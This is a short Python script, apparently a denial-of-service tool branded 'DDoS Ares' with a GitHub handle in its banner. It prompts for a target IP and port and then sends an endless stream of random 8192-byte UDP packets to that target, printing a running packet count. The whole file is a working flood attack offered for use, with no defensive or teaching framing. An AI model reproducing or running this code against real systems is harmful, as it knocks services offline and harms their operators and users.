import socket
import random
import datetime

print("""
 ____  ____       ____       _                  
|  _ \|  _ \  ___/ ___|     / \   _ __ ___  ___ 
| | | | | | |/ _ \___ \    / _ \ | '__/ _ \/ __|
| |_| | |_| | (_) |__) |  / ___ \| | |  __/\__ |
|____/|____/ \___/____/  /_/   \_\_|  \___||___/

""")
print('''
GITHUB:zxy-fish
''')

sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

byte = random._urandom(8192)

ip = input("IP TARGET >>>")
port = input("PORT      >>>")

packs = 0

while True:
    try:
        sk.sendto(byte, (ip, int(port)))
    except socket.gaierror:
        print("Please enter a correct ip and port!")
        break
    packs += 1
    print(f'Send {packs} packs to {ip}')
